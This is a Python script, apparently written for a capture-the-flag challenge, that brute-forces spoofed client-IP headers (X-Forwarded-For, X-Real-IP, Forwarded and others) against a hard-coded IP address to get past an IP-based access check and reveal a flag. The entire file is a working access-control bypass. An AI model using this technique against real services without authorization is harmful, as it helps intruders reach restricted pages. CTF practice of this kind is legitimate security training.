#!/usr/bin/env python3
# find_flag_xff.py
# Try many XFF/related headers against http://35.185.177.55/index.php
# Will print responses that contain "flag" (case-insensitive).

import requests, itertools, sys

URL = "http://35.185.177.55/index.php"
HEADERS = [
    "X-Forwarded-For", "X-Real-IP", "X-Originating-IP",
    "X-Remote-IP", "X-Remote-Addr", "Client-IP", "Forwarded", "X-Forwarded",
    "True-Client-IP",
]
IP_VALUES = [
    "35.185.177.55", "127.0.0.1", "localhost", "::1",
    "35.185.177.55:80", "127.0.0.1:80",
    "1.2.3.4, 35.185.177.55", "35.185.177.55, 1.2.3.4",
    "1.2.3.4, 127.0.0.1", "127.0.0.1, 1.2.3.4",
]

# Add some Forwarded formatted values
IP_VALUES += ["for=35.185.177.55", "for=127.0.0.1", "for=127.0.0.1;by=127.0.0.1;proto=http"]

# Also try combos of multiple headers at once
COMBO_HEADERS = [
    {"X-Forwarded-For":"35.185.177.55", "X-Real-IP":"35.185.177.55"},
    {"X-Forwarded-For":"127.0.0.1", "X-Real-IP":"127.0.0.1"},
    {"X-Forwarded-For":"1.2.3.4, 35.185.177.55", "X-Remote-Addr":"35.185.177.55"},
]

session = requests.Session()
session.headers.update({"User-Agent":"ctf-xff-checker/1.0"})

def try_single(h, v):
    headers = {h:v}
    try:
        r = session.get(URL, headers=headers, timeout=6)
        text = r.text.lower()
        if "flag" in text or "FLAG" in r.text:
            print("==== FOUND (single) ====")
            print("Header:", headers)
            print("Status:", r.status_code)
            print(r.text)
            return True
        # print brief summary
        print("Tried:", headers, "=>", r.status_code, "len=", len(r.text))
    except Exception as e:
        print("Error for", headers, ":", e)
    return False

def try_combo(mapping):
    try:
        r = session.get(URL, headers=mapping, timeout=6)
        text = r.text.lower()
        if "flag" in text:
            print("==== FOUND (combo) ====")
            print("Headers:", mapping)
            print("Status:", r.status_code)
            print(r.text)
            return True
        print("Tried combo:", mapping, "=>", r.status_code, "len=", len(r.text))
    except Exception as e:
        print("Error for combo", mapping, ":", e)
    return False

# first single-headers
for h in HEADERS:
    for v in IP_VALUES:
        if try_single(h, v):
            sys.exit(0)

# combos
for mapping in COMBO_HEADERS:
    if try_combo(mapping):
        sys.exit(0)

print("Done. No flag-like content found. Paste any interesting response (200 with different body) here and I'll analyze.")
